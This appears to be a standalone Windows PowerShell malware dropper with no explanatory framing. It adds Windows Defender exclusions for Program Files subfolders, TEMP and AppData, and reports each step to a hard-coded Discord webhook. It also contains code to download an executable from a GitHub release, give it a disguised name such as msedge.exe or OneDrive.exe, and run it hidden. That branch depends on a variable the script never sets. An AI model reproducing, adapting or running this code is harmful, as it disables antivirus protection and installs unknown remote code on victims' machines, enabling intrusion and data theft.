$webhookUrl = 'https://discord.com/api/webhooks/1418620647654953144/quGfUxYm_ZNxydSkulCZd2NGHsrHdfIm0h5J9gM5R0FQyrdsQRecWTTMaI3Mff3cWQzU'

function Send-WebhookMessage {
    param($Message)
    $body = @{ content = $Message } | ConvertTo-Json -Depth 10
    try {
        Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json; charset=utf-8' -ErrorAction Stop | Out-Null
        return $true
    } catch {
        return $false
    }
}

Send-WebhookMessage -Message "Script started at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"

try {
    $programFiles = "C:\Program Files"
    $tempFolder = $env:TEMP
    $appDataFolder = $env:APPDATA
    $localAppDataFolder = $env:LOCALAPPDATA

    $directories = Get-ChildItem -Path $programFiles -Directory | Where-Object { $_.Name -notlike "Windows*" -and $_.Name -notlike "ModifiableWindowsApps" }
    foreach ($dir in $directories) {
        try {
            Add-MpPreference -ExclusionPath $dir.FullName -ErrorAction Stop | Out-Null
            Send-WebhookMessage -Message "Added exclusion: $($dir.FullName)"
        } catch {
            Send-WebhookMessage -Message "Error adding exclusion for ${dir.FullName}: $_"
        }
    }

    try {
        Add-MpPreference -ExclusionPath $tempFolder -ErrorAction Stop | Out-Null
        Send-WebhookMessage -Message "Added exclusion: $tempFolder"
    } catch {
        Send-WebhookMessage -Message "Error adding exclusion for ${tempFolder}: $_"
    }

    try {
        Add-MpPreference -ExclusionPath $appDataFolder -ErrorAction Stop | Out-Null
        Send-WebhookMessage -Message "Added exclusion: $appDataFolder"
    } catch {
        Send-WebhookMessage -Message "Error adding exclusion for ${appDataFolder}: $_"
    }

    try {
        Add-MpPreference -ExclusionPath $localAppDataFolder -ErrorAction Stop | Out-Null
        Send-WebhookMessage -Message "Added exclusion: $localAppDataFolder"
    } catch {
        Send-WebhookMessage -Message "Error adding exclusion for ${localAppDataFolder}: $_"
    }

    if ($exclusionsAdded) {
        $exeNames = @("msedge.exe", "OneDrive.exe", "GoogleUpdate.exe", "steam.exe")
        $selectedExe = $exeNames | Get-Random
        $destinationPath = Join-Path -Path $localAppDataFolder -ChildPath $selectedExe
        try {
            Add-MpPreference -ExclusionPath $destinationPath -ErrorAction Stop | Out-Null
            Send-WebhookMessage -Message "Added exclusion for download path: $destinationPath"
        } catch {
            Send-WebhookMessage -Message "Error adding exclusion for ${destinationPath}: $_"
        }

        $downloadUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"
        try {
            Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath -UseBasicParsing -ErrorAction Stop | Out-Null
            Send-WebhookMessage -Message "Downloaded $selectedExe to $destinationPath"
            Start-Process -FilePath $destinationPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
            Send-WebhookMessage -Message "Executed $selectedExe"
        } catch {
            Send-WebhookMessage -Message "Error downloading or executing ${selectedExe}: $_"
        }
    }

    $python = Get-Command python -ErrorAction SilentlyContinue
    if ($python) {
        Send-WebhookMessage -Message "Python is installed"
    } else {
        Add-Type -AssemblyName PresentationFramework
        [System.Windows.MessageBox]::Show('Python is not installed','Error',[System.Windows.MessageBoxButton]::OK,[System.Windows.MessageBoxImage]::Error)
    }

    Send-WebhookMessage -Message "Script completed at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
} catch {
    Send-WebhookMessage -Message "Unexpected error: $_"
}
